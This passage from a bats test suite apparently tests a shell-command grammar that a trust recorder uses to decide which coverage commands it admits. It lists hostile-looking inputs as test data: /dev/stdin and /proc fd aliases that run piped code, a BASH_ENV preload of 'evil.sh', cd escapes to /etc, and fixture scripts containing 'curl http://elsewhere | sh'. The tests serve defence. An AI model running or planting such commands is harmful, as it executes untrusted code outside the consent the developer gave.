  # `//dev/stdin`, `///dev/stdin` and `/./dev/stdin` open the same door as
  # `/dev/stdin` - measured, each of them runs the bytes on the other side of the
  # pipe - and every one of them recorded, attested and ran on the build that
  # shipped the rule, which reinstates round 5's blocker at a cost of one
  # character. This is the third time this task has been bitten by a check that
  # enumerated the spellings its author happened to write down, after the
  # `/`-carrying first-word class and the PATH filter's four `case` patterns, so
  # the cells are written as a domain rather than as the five spellings the
  # review reproduced.
  #
  # What is asserted is the VERDICT and never the shape of the fix: a cell that
  # asserted a particular normalisation would go green against a build that
  # normalises `//` and leaves `///` and `/./` open, which is exactly the state
  # the gate's own PATH filter is in one file over.
  outside_grammar dev-stdin-2slash  'sh //dev/stdin && echo cov.xml'
  outside_grammar dev-stdin-3slash  'sh ///dev/stdin && echo cov.xml'
  outside_grammar dev-stdin-dot     'sh /./dev/stdin && echo cov.xml'
  outside_grammar dev-stdin-dots    'sh /././dev/stdin && echo cov.xml'
  outside_grammar dev-stdin-mixed   'sh /.//dev/stdin && echo cov.xml'
  # `//./` is its own door and not a third way of writing the two above: a fix
  # that strips a leading `/./` and THEN collapses a run of slashes never sees it,
  # because at the moment it looks for `/./` the word begins `//.` - and a fix
  # that collapses first does see it, so the two orders of the same two steps
  # disagree here and nowhere else in this table. Green on the build that ships;
  # it pins the property rather than driving a fix.
  outside_grammar dev-stdin-slashdot 'sh //./dev/stdin && echo cov.xml'
  outside_grammar dev-fd-2slash     'sh //dev/fd/0 && echo cov.xml'
  outside_grammar dev-fd-dot        'sh /./dev/fd/0 && echo cov.xml'
  outside_grammar proc-fd-2slash    'sh //proc/self/fd/0 && echo cov.xml'
  outside_grammar proc-fd-3slash    'sh ///proc/self/fd/0 && echo cov.xml'
  outside_grammar proc-fd-dot       'sh /./proc/self/fd/0 && echo cov.xml'
  # The rule belongs to the operand and not to the word `sh`, so two more card
  # words carry an aliased spelling: a build that fixes the comparison in one arm
  # and not in the class reds here.
  outside_grammar dev-bash-2slash   'bash //dev/stdin && echo cov.xml'
  outside_grammar proc-python-dot   'python3 /./proc/self/fd/0 && echo cov.xml'
  # The pipeline, which is the shape the payload actually arrives in and the one
  # the review reproduced end to end: the first part prints a command and the
  # second runs it, and no word of the value names what runs.
  outside_grammar dev-pipeline-2slash 'sh ./gen.sh | sh //dev/stdin'
  # Two spellings that already refuse today, kept as cells because the obvious
  # narrowing of this rule - normalise the path and compare it to a list of the
  # device names - loses them: the prefix is what matters, not the file at the
  # end of it, and /dev/ has more doors in it than the three anybody listed.
  outside_grammar dev-interior-slash 'sh /dev//stdin && echo cov.xml'
  outside_grammar dev-interior-dot   'sh /dev/./stdin && echo cov.xml'
  # A token that cannot be printed as one word, or a separator that is not one of
  # the four. `sh 'a b.sh'` is what round 2 turned into the junk token `'a`.
  outside_grammar quoted-space    "sh 'a b.sh' && echo cov.xml"
  outside_grammar background      'sh .harmonia/cov.sh & echo cov.xml'
  outside_grammar doubled-sep     'sh .harmonia/cov.sh && && echo cov.xml'
  outside_grammar trailing-sep    'sh .harmonia/cov.sh &&'
  outside_grammar case-sep        'sh .harmonia/cov.sh ;; echo cov.xml'
  # Anything the shell would expand before the file is named: the recorder cannot
  # read what it would become, and the gate would run something else.
  outside_grammar subst-dollar    'sh $(cat p) && echo cov.xml'
  outside_grammar subst-var       'sh ${S} && echo cov.xml'
  outside_grammar tilde           'sh ~/x.sh && echo cov.xml'
  outside_grammar glob            'sh .harmonia/*.sh && echo cov.xml'
  # config-lib.sh:17 is not a YAML parser and strips only surrounding blanks, so a
  # trailing comment reaches the grammar as tokens. Refused rather than trimmed:
  # trimming would make the digested string differ from what eval receives.
  outside_grammar comment         'sh .harmonia/cov.sh && echo cov.xml # writes cov.xml'
  # The bare-word programs, which is the cost of the round and is declared rather
  # than hidden. `npx vitest --coverage` is not the counter-example it looks like:
  # it runs node_modules/.bin/vitest, a file in the tree, so admitting it while
  # binding nothing IS the defect - its in-grammar respelling is the path-head cell
  # in the accept test below.
  outside_grammar bareword-make   'make cov && echo cov.xml'
  outside_grammar bareword-npm    'npm run cov && echo cov.xml'
  outside_grammar bareword-npx    'npx vitest --coverage && echo cov.xml'
  outside_grammar bareword-pytest 'pytest --cov=src && echo cov.xml'
  outside_grammar bareword-go     'go test ./... && echo cov.xml'
  # The `cd` traps, each one a reproduced attack rather than a tidiness rule. With
  # `;` allowed, `cd nosuchdir ; sh cov.sh` binds sub/cov.sh while the shell runs
  # cov.sh at the root. With only a lexical check on the operand, `cd esc` where
  # esc is a tracked symlink to /tmp passes every no-`..` and no-leading-`/` rule,
  # runs out-of-tree code and survives its rewrite - and every token on that line
  # reads as an in-tree relative name.
  #
  # ROUND 5 narrows the `cd` rules to what the STRING decides, because admission
  # stopped being a function of the tree (section 5's purity axis: the same value
  # must get the same verdict against any tree, and `cd esc` cannot be judged
  # without one). What survives is the shape - one leading cd, one operand, `&&`
  # after it, no `..`, no leading `-`/`+` - and `cd-symlink-out` and `cd-not-a-dir`
  # move to the accept table with the rest of the retirement.
  outside_grammar cd-parent       'cd .. && sh ./cov.sh && echo cov.xml'
  # ROUND 5, R12, and it is a spec-inversion back to the refuse side rather than a
  # cell that never moved: this was drafted as an accept cell, because round 4
  # refused it through the same must-resolve-inside-the-tree test as `cd esc` and
  # nothing in the string-only rule list replaced that. The rule that replaces it
  # is about READING rather than about resolution: every word after a `cd` is read
  # from where the cd lands, so `cd /etc && sh ./cov.sh` shows a reader
  # `./cov.sh` - a name that looks repository-relative - while `/etc/cov.sh` is
  # what runs. It is the one cd shape where the later words stop naming files in
  # this repository and go on looking as though they do. Decidable from the
  # string, one `case` arm, and purity is untouched.
  #
  # `cd esc` where `esc` is a symlink out of the tree stays ADMITTED, one table
  # down. Same destination, opposite verdicts, and the asymmetry is the round's
  # own line: what can be decided from the string is decided, what cannot is
  # declared - and asking where `esc` points is a filesystem question.
  outside_grammar cd-absolute     'cd /etc && sh ./cov.sh && echo cov.xml'
  outside_grammar cd-absolute-tmp 'cd /tmp && sh ./cov.sh && echo cov.xml'
  outside_grammar cd-semicolon    'cd nosuchdir ; sh ./cov.sh && echo cov.xml'
  outside_grammar cd-pipe         'cd sub | sh ./cov.sh'
  outside_grammar cd-twice        'cd sub && cd sub && sh ./cov.sh && echo cov.xml'
  outside_grammar cd-late         'sh .harmonia/cov.sh && cd sub && echo cov.xml'
  outside_grammar cd-two-operands 'cd sub extra && sh ./cov.sh && echo cov.xml'
  # A word whose BASENAME is on the card is held to the interpreter's rules
  # wherever it is spelled from (R11), so an in-tree `./sh` is not a way to hand a
  # second interpreter word the operand: `bash` carries no `/` and R10 refuses it.
  # Round 4 refused these three by resolution, which needed the tree; round 5
  # refuses them from the string, and the three spellings stay because the absolute
  # and the through-a-`.` forms are what defeat a textual prefix test.
  outside_grammar head-symlink-rel "./sh bash scripts/cov.sh && echo cov.xml"
  outside_grammar head-symlink-abs "$R/sh bash scripts/cov.sh && echo cov.xml"
  outside_grammar head-symlink-dot "${R%/*}/./${R##*/}/sh bash scripts/cov.sh && echo cov.xml"
  # An assignment prefix is not a first word: bash takes the first NON-assignment
  # word as the program, while a rule asking only "does this word carry a /" takes
  # the assignment and makes the interpreter and its script data.
  #
  # ROUND 5 INVERTS THE RULE to "no `=` anywhere in a first word", and the two
  # `+=` cells are why: `NAME+=value` is an assignment bash accepts and the regex
  # `^[A-Za-z_][A-Za-z0-9_]*=` does not match, so the word fell through to the
  # carries-a-`/` arm and was classified as THE PROGRAM. `V+=x/y sh ...` was
  # measured recording and displaying `V+=x/y` as the thing that runs; the
  # `BASH_ENV+=` spelling preloads a script into the interpreter that follows it
  # (reproduced firing), and the same shape sets `CDPATH` from inside the value
  # and walks past G1 and every cd rule. `=` keeps its place in later words.
  outside_grammar assign-slash     'V=x/y sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar assign-abs       'PATH=/usr/bin sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar assign-plus      'V+=x/y sh .harmonia/cov.sh && echo cov.xml'
  outside_grammar assign-bash-env  'BASH_ENV+=./evil.sh bash .harmonia/cov.sh && echo cov.xml'
  outside_grammar assign-cdpath    'CDPATH+=./sub cd sub && sh ./cov.sh && echo cov.xml'
  # `+opt` is `-opt` with one character changed, and every POSIX shell takes both.
  outside_grammar interp-plus      'sh +x .harmonia/cov.sh && echo cov.xml'
  outside_grammar interp-plus-bash 'bash +u .harmonia/cov.sh && echo cov.xml'
  # `cd -P` consumes its own operand and leaves cd with none, which lands in $HOME:
  # the record attests a file inside the repository and the shell runs one outside
  # it that the developer was never shown. The `-P` directory in the fixture is
  # what makes this cell about the dash and not about a missing directory.
  outside_grammar cd-dash-opt      'cd -P && sh ./cov.sh && echo cov.xml'
  outside_grammar cd-dash-L        'cd -L && sh ./cov.sh && echo cov.xml'
  # `readlink -f` is physical and bash's `cd` is logical, so with `alias` a symlink
  # the recorder binds xy/deep/cov.sh and the shell runs deep/cov.sh. Both files
  # exist in the fixture, so this cell cannot pass by the target being absent.
  outside_grammar cd-dotdot-mid    'cd alias/../deep && sh ./cov.sh && echo cov.xml'
  # The same `..` one word over, where it does not diverge and is refused anyway:
  # `sh ../tools/cov.sh` in a monorepo is committed repository content, and
  # `cd ../tools && sh ./cov.sh` - the same escape, one position over - already
  # refuses. Same escape, opposite verdicts, decided by position; and the direct
  # spelling of the first is one word shorter. R4 is kept whole in round 5, with
  # its cost declared rather than narrowed mid-round.
  outside_grammar script-dotdot    'sh sub/../scripts/cov.sh && echo cov.xml'
  outside_grammar escape-dotdot    'sh ../ext/cov.sh && echo cov.xml'
  # The `..` and the word class hold at EVERY token of a part, not only the first
  # two: a build applying them to the head admits both of these and is otherwise
  # clean (the token-position axis of the sweep, as two named cells).
  outside_grammar arg-dotdot       'sh ./scripts/cov.sh ../out.xml && echo cov.xml'
  outside_grammar arg-subst        'sh ./scripts/cov.sh $(cat p) && echo cov.xml'
  # The caps, which are what a human can read rather than what a machine can
  # survive: a 2179-byte value wraps to 28 terminal lines with one code-running
  # segment in it, and a printed control nobody can read is not a control.
  local long many
  long="$(head -c 1100 /dev/zero | tr '\0' x)"
  outside_grammar over-bytes      "sh .harmonia/cov.sh $long && echo cov.xml"
  many="$(i=0; while [ $i -lt 70 ]; do printf 'a '; i=$((i+1)); done)"
  outside_grammar over-tokens     "sh .harmonia/cov.sh $many && echo cov.xml"
  # The control that keeps every cell above honest: a build that refuses
  # everything satisfies all of them and this one kills it.
  inside_grammar in-grammar-control 'sh .harmonia/cov.sh && echo cov.xml'
}

@test "every shape the grammar admits records, is read back, and is never executed by the recorder" {
  grammar_tree
  inside_grammar interp         'sh .harmonia/cov.sh && echo cov.xml'
  inside_grammar interp-quoted  "sh '.harmonia/cov.sh' && echo cov.xml"
  inside_grammar interp-bash    'bash .harmonia/cov.sh && echo cov.xml'
  # A script outside the tree, and an in-tree name that resolves outside it: both
  # legitimate, both recordable, neither content-bound (the ceiling test above).
  inside_grammar interp-outside "sh $EXT/cov.sh && echo cov.xml"
  inside_grammar interp-symlink 'sh ./link.sh && echo cov.xml'
  # THE OVER-REFUSAL GUARDS FOR THE /dev/ AND /proc/ RULE, and they are why the
  # refuse cells above cannot be satisfied cheaply: "refuse any operand carrying
  # `//` or `/./`" passes every one of them and refuses these, which are ordinary
  # paths a wrapper generator writes without thinking about them. What the rule is
  # about is the two filesystems, not the punctuation that reaches them.
  #
  # THREE CELLS AND NOT ONE, because the punctuation sits in three places and a
  # guard for one of them leaves the other two unheld: a build refusing `/./` and
  # not `//` is green on the first and third of these, and a front-only
  # normaliser never looks where the second one puts it.
  inside_grammar interp-dot-abs   "sh $EXT/./cov.sh && echo cov.xml"
  inside_grammar interp-2slash-abs "sh $EXT//cov.sh && echo cov.xml"
  inside_grammar interp-dot-rel   'sh ./tools/./x.sh && echo cov.xml'
  #
  # ROUND 6's TWO REMEDIES, and they are what the seven cells this round moved to
  # the refuse table cost. Both already record on the round-5 build, so this is a
  # documentation change with an accept cell rather than new code - and the accept
  # cell is the point: `./gradlew jacoco` and `./node_modules/.bin/vitest run
  # --coverage` are refused two tables up, so a round that refuses them without
  # asserting their respellings has narrowed the grammar to something nobody can
  # use. WHICH interpreter goes in front is not a free choice and the documents
  # have to say so: an npm-style shim is a .js file that runs under `node` and
  # dies under `sh`, a pnpm or yarn shim is `#!/bin/sh` and does the reverse, and
  # a native binary (esbuild, swc, biome, turbo) runs under neither and needs the
  # wrapper. The recorder opens no file, so it cannot tell a developer which; both
  # spellings are asserted here because both are things a developer will write.
  inside_grammar remedy-gradlew 'sh ./gradlew jacocoTestReport && echo cov.xml'
  inside_grammar remedy-node    'node ./node_modules/.bin/tool --coverage && echo cov.xml'
  inside_grammar remedy-sh-tool 'sh ./node_modules/.bin/tool --coverage && echo cov.xml'
  inside_grammar remedy-script  'sh ./scripts/cov.sh && echo cov.xml'
  inside_grammar remedy-python  'python3 ./tools/cov.py && echo cov.xml'
  inside_grammar inert-true     'true && sh .harmonia/cov.sh && echo cov.xml'
  inside_grammar inert-only     'echo cov.xml'
  # Separators are separators whether they are spaced or glued: `a;b` and `a&&b`
  # are ordinary shell spellings, and a grammar that refused them would refuse
  # this suite's own k5 cell.
  inside_grammar glued-sep      'sh .harmonia/cov.sh; echo cov.xml'
  inside_grammar glued-and      'sh .harmonia/cov.sh&&echo cov.xml'
  inside_grammar cd-monorepo    'cd sub && sh ./cov.sh && echo sub/cov.xml'
  inside_grammar cd-then-inert  'cd sub && true && sh ./cov.sh && echo sub/cov.xml'
  # ROUND 4's accept side, and it is where the cost of the rules above is paid or
  # not paid. The tree root IS a directory inside the repository: refusing `cd .`
  # with "not a directory inside this repository: ." is a wrong message on a
  # legitimate value, which is what sends a developer to the wrong remedy.
  inside_grammar cd-dot         'cd . && sh .harmonia/cov.sh && echo cov.xml'
  inside_grammar cd-trailing    'cd sub/ && sh ./cov.sh && echo sub/cov.xml'
  # Arguments after the script are data, including one that spells a path.
  inside_grammar interp-args    'sh .harmonia/cov.sh out --out=out/cov.xml && echo out/cov.xml'
  # A file name that is not there in a NON-executed position is still data: the
  # report a coverage run creates has not been read by anyone.
  inside_grammar report-absent  'sh .harmonia/cov.sh && echo out/cov.xml'
  #
  # ROUND 5's ELEVEN RETIREMENTS, moved here from the refuse table above rather
  # than deleted from it. Each one was refused by rounds 3 or 4 to protect a
  # recorded line about a file's contents; there are no such lines now, so a build
  # that still refuses any of them goes RED here - which is the whole mechanism by
  # which this retirement is asserted instead of merely unpinned.
  #
  # ROUND 6 TAKES FIVE OF THE ELEVEN BACK, and they are in the refuse table now
  # rather than deleted from this one: `head-launcher`, `tail-launcher`,
  # `head-symlink-any`, `tool-symlink-out` and `path-absent` were retirements of
  # a CONTENT claim, and what refuses them now is a claim about the first word -
  # a different rule, refusing them for a different reason. The retirement itself
  # is untouched: nothing below opens a file, and the six cells that stayed here
  # still assert that a rewritten, repointed, absent or unreadable file costs no
  # consent. `path-abs-in` moved with them.
  #
  # A script that is not there yet, in an executed position. R9 refused it so that
  # "absent" could not be a recorded state that stays put while real code appears;
  # nothing is recorded about it now. Its `./`-headed spelling is refused by the
  # first-word rule two tables up, which is why only the interpreter one is here.
  inside_grammar interp-absent    'sh .harmonia/late.sh && echo cov.xml'
  # A directory where a script goes. `python3 covdir` runs covdir/__main__.py and
  # `node covdir` runs covdir/index.js; what an interpreter does with its operand
  # is the declared residue, and the `dir` state only ever protected a recorded
  # line. R10 still asks the operand for its `/`, which is the whole difference
  # between this pair and `node cov` in the refuse table above: the bare spelling
  # is PATH-searched and the slash spelling is not.
  inside_grammar interp-dir       'python3 ./covdir && echo cov.xml'
  inside_grammar interp-resolves-slash 'node ./covdir && echo cov.xml'
  # A `cd` operand the string cannot tell from any other: a symlink out of the
  # tree, and a name that is not a directory at all. Both were refused by asking
  # the filesystem, which is exactly what round 5's admission may not do - the
  # same value has to get the same verdict against any tree.
  inside_grammar cd-symlink-out   'cd esc && sh ./cov.sh && echo cov.xml'
  # A `cd` operand that is not a directory at all, which is a stat and therefore
  # not a question this admission may ask (section 3's own row for it). Nothing
  # runs when the cd fails, because `&&` is the only join a recordable cd takes.
  inside_grammar cd-not-a-dir     'cd cov.tpl && sh ./cov.sh && echo cov.xml'
  #
  # `cd /etc` is NOT here: it is refused by R12 in the table above. The asymmetry
  # with `cd esc` one line up is deliberate and declared - same destination,
  # opposite verdicts - because what can be decided from the string is decided and
  # what cannot is declared, and asking where `esc` points is a filesystem
  # question that went with R1.
}

@test "the head class and the basename match are two deletions, and a build that lands one without the other is refused by a different cell" {
  # ROUND 6's headline change is two edits and neither one closes the arm on its
  # own. This cell is the pair, side by side, so the reader who wants to know
  # which edit a red belongs to does not have to run the whole file.
  #
  # A. THE CLASS. Round 5 gave any `/`-carrying first word its own kind and left
  #    its later words alone. Deleting it refuses `./scripts/cov.sh`, a launcher,
  #    and a tool named by its path.
  # B. THE CARD MATCH. The interpreter test asked whether a word's BASENAME was on
  #    the card, so `/bin/sh`, `./sh` and `/usr/bin/python3` were interpreters
  #    "however they are spelled". With A applied and B not, all three still
  #    record - the operand rules are satisfied and the class was never reached -
  #    and the repository's own `./sh` is one of them. Measured on a build with A
  #    alone: `/bin/sh ./cov.sh`, `./sh ./cov.sh` and `/usr/bin/python3 ./x.py`
  #    all rc=0. Measured on a build with B alone: `/usr/bin/env sh ./cov.sh` and
  #    `./node_modules/.bin/vitest run --coverage` both rc=0.
  #
  # Both columns are asserted through `trust_refs` itself rather than through the
  # recorder, because what is being separated is one predicate's two arms and the
  # cell should red on the arm rather than on any refusal at all - the recorder's
  # own reason text is asserted in the tables above.
  local w reason rc
  refs() {   # <value> -> rc, with the reason in $reason
    # `&& rc=0 || rc=$?`, never a bare `rc=$?` on the next line: a failing
    # assignment is a failing command, and half of this cell's probes are meant
    # to fail - under bats' errexit the bare form takes the body down before the
    # assertion that wanted the failure ever runs.
    reason="$(bash -c 'set -u; . "$1" || exit 127; trust_refs "$2"' _ "$TRUST" "$1" 2>&1)" && rc=0 || rc=$?
  }
  # The control first: the one spelling this round blesses records, so nothing
  # below is satisfied by a build that refuses every value on the machine.
  refs 'sh ./cov.sh && echo cov.xml'
  [ "$rc" -eq 0 ] || { echo "the plainest value the grammar admits was refused: $reason"; false; }
  # A. Deleting the class. Each of these carries a first word with a `/` whose
  # basename is NOT on the card, so the card match cannot decide them either way.
  for w in \
    './scripts/cov.sh && echo cov.xml' \
    './node_modules/.bin/vitest run --coverage && echo cov.xml' \
    './gradlew jacocoTestReport && echo cov.xml' \
    '/usr/bin/env sh ./cov.sh && echo cov.xml' \
    '/opt/tools/run --cov && echo cov.xml'
  do
    refs "$w"
    [ "$rc" -ne 0 ] || { echo "A[$w]: a first word carrying a / is still its own class, so its later words are unconstrained"; false; }
  done
  # B. Matching the card on the whole word. Each of these carries a first word
  # whose basename IS on the card, so a build that deleted the class and kept the
  # basename test admits every one of them.
  for w in \
    '/bin/sh ./cov.sh && echo cov.xml' \
    './sh ./cov.sh && echo cov.xml' \
    '/usr/bin/python3 ./cov.py && echo cov.xml' \
    './node_modules/.bin/sh ./cov.sh && echo cov.xml' \
    'sh ./gen.sh | /bin/bash'
  do
    refs "$w"
    [ "$rc" -ne 0 ] || { echo "B[$w]: an interpreter can still be spelled with a path, so the repository decides what the card's largest class runs"; false; }
  done
  # ...and the two edits together do not cost the nine words their own spellings,
  # which is what stops the pair being satisfied by "refuse anything with a / in
  # it": every card word records with an operand that carries one.
  for w in \
    'sh ./cov.sh' 'bash ./cov.sh' 'dash ./cov.sh' \
    'python ./cov.py' 'python3 ./cov.py' 'node ./cov.js' \
    'cd sub && sh ./cov.sh' 'echo cov.xml' 'true'
  do
    refs "$w"
    [ "$rc" -eq 0 ] || { echo "C[$w]: one of the nine words a part may begin with is refused: $reason"; false; }
  done
}

@test "a first-word class that is refused in the first part is refused in every part, and one that is admitted is admitted in every part" {
  # THE DIRECT ANSWER TO ROUND 4's BLOCKER B1, as a named cell beside its
  # generative form in the sweep below. The wrong build it exists to catch is one
  # whose first-word rule fires on the first code-running part only - three lines
  # of `[ "$nseg" = 1 ]`, the shape the recorder already uses legitimately for
  # `cd` - and round 4's own generative criterion could not see it, because no
  # generated value ever put an interesting word anywhere but the first part.
  #
  # It is written as a LOOP over positions rather than as one cell per shape,
  # because the gap is a domain: a single tail cell is satisfied by a build that
  # checks parts 1 and 2 and stops, and this is the same reasoning that put the
  # flag-shape loop in tests/coverage.bats.
  grammar_tree
  local w
  # An inert leading part, so the value in front of the word under test is
  # admissible in every build and the only thing that varies is WHERE the word is.
  for w in \
    'env sh .harmonia/cov.sh' \
    'V=x/y sh .harmonia/cov.sh' \
    'V+=x/y sh .harmonia/cov.sh' \
    'sh cov.sh' \
    'sh +x .harmonia/cov.sh' \
    'sh sub/../scripts/cov.sh' \
    'make cov' \
    'python3.12 .harmonia/cov.sh' \
    '/bin/sh -c payload' \
    'sh .harmonia/cov.sh ../out.xml' \
    '/bin/sh .harmonia/cov.sh' \
    './sh .harmonia/cov.sh' \
    './scripts/cov.sh' \
    "$EXT/launch sh .harmonia/cov.sh" \
    'sh /dev/stdin'
  do
    outside_grammar "part1[$w]" "$w"
    outside_grammar "part2[$w]" "echo cov.xml && $w"
    outside_grammar "part3[$w]" "echo cov.xml && echo cov.xml && $w"
    # ...and after each of the four separators, which is the axis a build that
    # mis-parses `|` walks through: one such build admitted
    # `sh .harmonia/cov.sh | zqpayload cov.xml`, printed it to the developer and
    # ran an arbitrary program under recorded consent with everything else green.
    outside_grammar "semi[$w]"  "echo cov.xml ; $w"
    outside_grammar "or[$w]"    "echo cov.xml || $w"
    outside_grammar "pipe[$w]"  "echo cov.xml | $w"
  done
  # The other direction, which is what stops all of the above being satisfied by a
  # build that refuses any value with more than one part.
  for w in \
    'sh .harmonia/cov.sh' \
    'bash ./scripts/cov.sh' \
    'python3 ./tools/cov.py' \
    'echo cov.xml' \
    'true'
  do
    inside_grammar "admit1[$w]" "$w"
    inside_grammar "admit2[$w]" "echo cov.xml && $w"
    inside_grammar "admit3[$w]" "echo cov.xml && echo cov.xml && $w"
    inside_grammar "admitsemi[$w]" "echo cov.xml ; $w"
    inside_grammar "admitor[$w]"   "echo cov.xml || $w"
    inside_grammar "admitpipe[$w]" "echo cov.xml | $w"
  done
  # `cd` is the one first word whose verdict IS position-dependent, and it is
  # exempt by name rather than by accident: a recordable cd is the first thing the
  # command does, so the exemption is paid for here rather than skipped.
  inside_grammar  cd-first 'cd sub && sh ./cov.sh && echo sub/cov.xml'
  outside_grammar cd-later 'echo cov.xml && cd sub && sh ./cov.sh'
}

# --- the printed line, and what it may promise -------------------------------
# INVERTED IN ROUND 5, whole. Rounds 2-4 promised that the printed list of files
# was exactly what consent bound, and made that list the developer's only control
# for a pointer value. There is no bound set now, so a printed set has nothing to
# equal, and the promise the print CAN keep is the one the byte rule needs beside
# it: the bytes the recorder shows as the command are the bytes it digests, and
# the bytes the gate will later evaluate. A build that prints an escaped, quoted
# or otherwise cleaned-up form of the value is the deception the byte class exists
# to stop, one layer up - and it was measured passing every other criterion in the
# round while printing the raw project.yaml line and digesting something else.
#
# So every `lists <path>` call below became `omits <path>`, one call site at a
# time: the per-file list is asserted ABSENT, which is what reds a build still
# printing one, and each shape then asserts that changing any file it names costs
# nothing while changing the string costs everything.

shows() {   # <label> <repo> <value>: record it, leaving everything but the command line in $LIST
  local label="$1" repo="$2" val="$3"
  set_cov "$repo" "$val"
  run bash "$TRUST" record --repo "$repo"
  [ "$status" -eq 0 ] || { echo "$label: the recorder refused a legitimate command ($val): $output"; return 1; }
  # The command is printed on its own line, BYTE FOR BYTE - `grep -x` rather than a
  # substring test, because a build that prints a quoted or escaped form of the
  # value contains the value nowhere and would satisfy a substring test through the
  # project.yaml line it echoes back. This is the round's whole display promise.
  printf '%s\n' "$output" | grep -qxF "$val" || {
    echo "$label: the recorder never printed the string it is recording, byte for byte: [$output]"; return 1; }
  # Everything BUT that line, captured before the reader is asked - `run` replaces
  # $output, and a LIST taken afterwards is the reader's silence rather than the
  # recorder's print, which is a cell that passes against any build at all.
  LIST="$(printf '%s\n' "$output" | grep -vxF "$val")"
  # ...and the line it printed is the string the reader accepts, so print and
  # digest cannot be two different strings.
  run treason "$repo" "$val"
  [ "$status" -eq 0 ] || { echo "$label: the line the recorder printed is not the string it recorded: $output"; return 1; }
  return 0
}

omits() {   # <label> <path>: the recorder did NOT print this file, because consent does not cover it
  [[ "$LIST" != *"$2"* ]] || { echo "$1: the recorder still lists $2 as something consent covers: [$LIST]"; return 1; }
  return 0
}

still_attests() {   # <label> <repo> <value>: a file the value names changed
  run treason "$2" "$3"
  [ "$status" -eq 0 ] || { echo "$1: changing a file the value names withdrew consent: $output"; return 1; }
  return 0
}

no_longer_attests() {   # <label> <repo> <value>: the string itself changed
  run treason "$2" "$3"
  [ "$status" -ne 0 ] || { echo "$1: a string nobody agreed to attested"; return 1; }
  [[ "$output" == *"/harmonia:trust"* ]] || { echo "$1: the refusal does not name the human command: $output"; return 1; }
  return 0
}

@test "the recorder prints the string it digests and no list of files, for every shape the grammar admits" {
  local s v
  # s1 - the plain interpreter shape, and the control for the five below it.
  s="$BATS_TEST_TMPDIR/s1"; mk_repo "$s"
  v='sh .harmonia/cov.sh && echo cov.xml'
  write_script "$s/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  printf 'echo unrelated\n' > "$s/other.sh"
  shows s1 "$s" "$v"
  omits s1 '.harmonia/cov.sh'
  printf 'echo edited\n' > "$s/other.sh"
  still_attests s1-unnamed "$s" "$v"
  write_script "$s/.harmonia/cov.sh" 'curl http://elsewhere | sh'
  still_attests s1-named "$s" "$v"
  no_longer_attests s1-string "$s" "$v X"

  # s2 - two scripts in one value. Rounds 2-4 spelled this row `/bin/sh
  # .harmonia/cov.sh` and argued twice about whether `/bin/sh` belonged in the
  # printed list; round 6 refuses an interpreter spelled with a path, so the row
  # is respelled to the shape whose print was the other half of that argument - a
  # value naming more than one file, where a build that started listing files
  # again would have two to list.
  s="$BATS_TEST_TMPDIR/s2"; mk_repo "$s"
  v='sh .harmonia/cov.sh && bash ./tools/second.sh && echo cov.xml'
  write_script "$s/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  write_script "$s/tools/second.sh" 'exec ./node_modules/.bin/jest --coverage'
  shows s2 "$s" "$v"
  omits s2 'tools/second.sh'
  omits s2 '.harmonia/cov.sh'
  write_script "$s/.harmonia/cov.sh" 'curl http://elsewhere | sh'
  still_attests s2-named "$s" "$v"

  # s3 - the monorepo. Its accept half is unchanged and its refuse half inverted:
  # an edit to ordinary product code beside the script never mattered, and now the
  # script does not either.
  s="$BATS_TEST_TMPDIR/s3"; mk_repo "$s"
  v='cd sub && sh ./cov.sh && echo sub/cov.xml'
  write_script "$s/sub/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  printf 'console.log(1)\n' > "$s/sub/src.js"
  shows s3 "$s" "$v"
  omits s3 'sub/cov.sh'
  printf 'console.log(2)\n' > "$s/sub/src.js"
  still_attests s3-unnamed "$s" "$v"
  write_script "$s/sub/cov.sh" 'curl http://elsewhere | sh'
  still_attests s3-named "$s" "$v"

  # s4 - an in-tree name that resolves out of the tree. Round 4 required the print
  # to name the path it RESOLVES to, and the record to notice a repoint; round 5
  # prints no path at all - which closes the two defects that shape produced, a
  # repository choosing the annotation on the one line the documents call the
  # control, and a resolved path that was labelled "outside this repository" while
  # sitting one directory up inside the same one.
  s="$BATS_TEST_TMPDIR/s4"; mk_repo "$s"
  local ext4="$BATS_TEST_TMPDIR/ext4"
  write_script "$ext4/tool.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  write_script "$ext4/other.sh" 'curl http://elsewhere | sh'
  ln -sfn "$ext4/tool.sh" "$s/link.sh"
  v='sh ./link.sh && echo cov.xml'
  shows s4 "$s" "$v"
  omits s4-resolved "$ext4/tool.sh"
  omits s4-token 'link.sh'
  ln -sfn "$ext4/other.sh" "$s/link.sh"
  still_attests s4-repointed "$s" "$v"

  # s5 - a command that names no file at all. The sentence a developer needs is no
  # longer "this one names nothing" - it is the same one every value gets, and the
  # patterns are the task criterion's own so a build satisfying one satisfies both.
  s="$BATS_TEST_TMPDIR/s5"; mk_repo "$s"
  v='echo cov.xml'
  shows s5 "$s" "$v"
  printf '%s\n' "$LIST" | grep -qEi 'whatever it contains|contents it has when it runs|trusted for' \
    || { echo "s5: the recorder never told the developer what consent does not cover: [$LIST]"; false; }
  printf 'echo edited\n' > "$s/f.sh"
  still_attests s5 "$s" "$v"

  # s6 - the report the command rewrites on every run, named twice on purpose,
  # bare and as --out=<path>. Round 3 needed this cell because binding it refused
  # the repository on its second gate run; it is kept because a build that starts
  # naming files again would name this one first.
  s="$BATS_TEST_TMPDIR/s6"; mk_repo "$s"
  v='sh .harmonia/cov.sh out --out=out/cov.xml && echo out/cov.xml'
  write_script "$s/.harmonia/cov.sh" 'mkdir -p out; echo report > out/cov.xml'
  mkdir -p "$s/out"; printf 'report\n' > "$s/out/cov.xml"
  shows s6 "$s" "$v"
  omits s6 '.harmonia/cov.sh'
  omits s6 'out/cov.xml'
  printf 'a different report\n' > "$s/out/cov.xml"
  still_attests s6-run2 "$s" "$v"

  # s7 - the display promise on a value written to be hard to print honestly:
  # glued separators, an option-looking word, a quoted operand. The `shows` helper
  # asserts the printed line byte for byte and then feeds it back through the
  # reader, which is what catches a build that prints one string and digests
  # another - the one shape the round's criteria set was measured at zero against.
  s="$BATS_TEST_TMPDIR/s7"; mk_repo "$s"
  v='sh .harmonia/cov.sh --out=a/b.xml,c:d+e@f&&sh ./tools/second.sh;echo a/b.xml'
  write_script "$s/.harmonia/cov.sh" 'true'
